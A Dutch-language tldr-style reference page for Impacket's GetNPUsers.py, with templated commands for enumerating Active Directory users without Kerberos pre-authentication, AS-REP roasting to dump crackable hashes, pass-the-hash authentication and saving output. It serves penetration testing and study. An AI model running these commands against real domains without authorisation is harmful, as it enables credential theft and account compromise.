# GetNPUsers.py

> Som Active Directory accounts op met Kerberos pre-authentication uitgeschakeld, die vatbaar kunnen zijn voor AS-REP roasting aanvallen.
> Onderdeel van de Impacket-suite.
> Meer informatie: <https://github.com/fortra/impacket>.

- Som gebruikers op met Kerberos pre-authentication uitgeschakeld (standaard anonieme enumeration):

`GetNPUsers.py {{domein}}/ -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}} -no-pass`

- Voer AS-REP roasting uit en dump kraakbare hashes voor offline kraking:

`GetNPUsers.py {{domein}}/ -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}} -no-pass -request`

- Authenticeer met valide credentials (als anonieme binding is uitgeschakeld):

`GetNPUsers.py {{domein}}/{{gebruikersnaam}}:{{wachtwoord}} -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}}`

- Gebruik pass-the-hash authenticatie in plaats van een wachtwoord:

`GetNPUsers.py {{domein}}/{{gebruikersnaam}} -hashes {{LM_Hash}}:{{NT_Hash}} -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}}`

- Sla de output op in een bestand voor verdere analyse:

`GetNPUsers.py {{domein}}/ -usersfile {{pad/naar/gebruikerslijst}} -dc-ip {{domain_controller_ip}} -request > {{pad/naar/output.txt}}`
